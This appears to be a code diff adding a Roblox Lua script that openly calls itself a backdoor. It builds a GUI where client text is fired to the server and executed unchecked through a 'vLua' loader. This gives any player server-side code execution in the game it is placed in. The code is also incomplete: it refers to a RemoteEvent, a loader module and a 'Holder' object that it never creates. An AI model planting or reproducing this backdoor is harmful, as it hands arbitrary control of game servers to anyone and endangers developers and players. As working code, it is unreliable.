@@ -1,0 +1,170 @@
+-- back door
+
+local Instances = {
+	BackDoor = Instance.new("ScreenGui"),
+	TextLabel = Instance.new("TextLabel"),
+	UICorner = Instance.new("UICorner"),
+	Frame = Instance.new("Frame"),
+	UICorner_2 = Instance.new("UICorner"),
+	source = Instance.new("TextBox"),
+	UITextSizeConstraint = Instance.new("UITextSizeConstraint"),
+	Execute = Instance.new("TextButton"),
+	UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint"),
+	TextButton = Instance.new("TextButton"),
+	UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint"),
+	Enable_server_sided = Instance.new("TextButton"),
+	UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint"),
+}
+
+Instances.BackDoor.Name = "BackDoor"
+Instances.BackDoor.Parent = game.StarterGui
+
+Instances.TextLabel.Name = "TextLabel"
+Instances.TextLabel.Parent = Instances.BackDoor
+Instances.TextLabel.Size = UDim2.new(0, 325, 0, 33)
+Instances.TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instances.TextLabel.Position = UDim2.new(0.31720826, 0, 0.238866404, 0)
+Instances.TextLabel.BorderSizePixel = 0
+Instances.TextLabel.BackgroundColor3 = Color3.fromRGB(103, 103, 103)
+Instances.TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+Instances.TextLabel.Text = "Backdoor made by someone"
+Instances.TextLabel.TextSize = 14
+Instances.TextLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+
+Instances.UICorner.Name = "UICorner"
+Instances.UICorner.Parent = Instances.TextLabel
+
+Instances.Frame.Name = "Frame"
+Instances.Frame.Parent = Instances.TextLabel
+Instances.Frame.Size = UDim2.new(1, 0, 5.84230757, 0)
+Instances.Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instances.Frame.Position = UDim2.new(0, 0, 1, 0)
+Instances.Frame.BorderSizePixel = 0
+Instances.Frame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
+
+Instances.UICorner_2.Name = "UICorner"
+Instances.UICorner_2.Parent = Instances.Frame
+
+Instances.source.Name = "source"
+Instances.source.Parent = Instances.Frame
+Instances.source.Size = UDim2.new(0.708557606, 0, 0.627264798, 0)
+Instances.source.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Instances.source.Position = UDim2.new(0.166189104, 0, 0.0696720704, 0)
+Instances.source.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
+Instances.source.CursorPosition = -1
+Instances.source.TextSize = 5
+Instances.source.TextColor3 = Color3.fromRGB(0, 0, 0)
+Instances.source.TextYAlignment = Enum.TextYAlignment.Top
+Instances.source.Text = "print(\"works\")"
+Instances.source.TextWrapped = true
+Instances.source.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+Instances.source.TextXAlignment = Enum.TextXAlignment.Left
+Instances.source.TextScaled = true
+
+Instances.UITextSizeConstraint.Name = "UITextSizeConstraint"
+Instances.UITextSizeConstraint.Parent = Instances.source
+Instances.UITextSizeConstraint.MaxTextSize = 20
+
+Instances.Execute.Name = "Execute"
+Instances.Execute.Parent = Instances.Frame
+Instances.Execute.Size = UDim2.new(0.20758535, 0, 0.120179884, 0)
+Instances.Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instances.Execute.Position = UDim2.new(0.0458453149, 0, 0.819672227, 0)
+Instances.Execute.BorderSizePixel = 0
+Instances.Execute.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+Instances.Execute.TextColor3 = Color3.fromRGB(0, 0, 0)
+Instances.Execute.Text = "Execute"
+Instances.Execute.TextWrapped = true
+Instances.Execute.TextSize = 14
+Instances.Execute.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+Instances.Execute.TextScaled = true
+
+Instances.UITextSizeConstraint_2.Name = "UITextSizeConstraint"
+Instances.UITextSizeConstraint_2.Parent = Instances.Execute
+Instances.UITextSizeConstraint_2.MaxTextSize = 14
+
+Instances.TextButton.Name = "TextButton"
+Instances.TextButton.Parent = Instances.Frame
+Instances.TextButton.Size = UDim2.new(0.184662744, 0, 0.116081752, 0)
+Instances.TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instances.TextButton.Position = UDim2.new(0.340974212, 0, 0.823770642, 0)
+Instances.TextButton.BorderSizePixel = 0
+Instances.TextButton.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+Instances.TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+Instances.TextButton.Text = "Clear"
+Instances.TextButton.TextWrapped = true
+Instances.TextButton.TextSize = 14
+Instances.TextButton.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+Instances.TextButton.TextScaled = true
+
+Instances.UITextSizeConstraint_3.Name = "UITextSizeConstraint"
+Instances.UITextSizeConstraint_3.Parent = Instances.TextButton
+Instances.UITextSizeConstraint_3.MaxTextSize = 14
+
+Instances.Enable_server_sided.Name = "Enable server-sided"
+Instances.Enable_server_sided.Parent = Instances.Frame
+Instances.Enable_server_sided.Size = UDim2.new(0.33106339, 0, 0.116081908, 0)
+Instances.Enable_server_sided.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instances.Enable_server_sided.Position = UDim2.new(0.593123198, 0, 0.823770463, 0)
+Instances.Enable_server_sided.BorderSizePixel = 0
+Instances.Enable_server_sided.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+Instances.Enable_server_sided.TextColor3 = Color3.fromRGB(0, 0, 0)
+Instances.Enable_server_sided.Text = "SS execute"
+Instances.Enable_server_sided.TextWrapped = true
+Instances.Enable_server_sided.TextSize = 14
+Instances.Enable_server_sided.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+Instances.Enable_server_sided.TextScaled = true
+
+Instances.UITextSizeConstraint_4.Name = "UITextSizeConstraint"
+Instances.UITextSizeConstraint_4.Parent = Instances.Enable_server_sided
+Instances.UITextSizeConstraint_4.MaxTextSize = 14
+
+-- Function "Script"
+(function()
+	local script = Instance.new("Script", Instances.Execute)
+	script.Parent.event.OnServerEvent:Connect(function(p,strin)
+		require(script.vLua)(strin)()
+	end)
+end)()
+
+-- Function "LocalScript"
+(function()
+	local script = Instance.new("LocalScript", Instances.Execute)
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.event:FireServer(script.Parent.Parent.source.Text)	
+	end)
+end)()
+
+-- Function "LocalScript"
+(function()
+	local script = Instance.new("LocalScript", Instances.TextButton)
+	script.Parent.MouseButton1Click:Connect(function() 
+		script.Parent.Parent.Holder.Text = ""
+	end)
+end)()
+
+-- Function "Script"
+(function()
+	local script = Instance.new("Script", Instances.Enable_server_sided)
+	script.Parent.event.OnServerEvent:Connect(function(p,strin)
+		require(script.vLua)(strin)()
+	end)
+end)()
+
+-- Function "LocalScript"
+(function()
+	local script = Instance.new("LocalScript", Instances.Enable_server_sided)
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.event:FireServer(script.Parent.Parent.source.Text)	
+	end)
+end)()
+
+-- Function "LocalScript"
+(function()
+	local script = Instance.new("LocalScript", Instances.TextLabel)
+	script.Parent.Draggable = true
+	script.Parent.Active = true
+	
+end)()
+
+--[[ End of generation. ]]
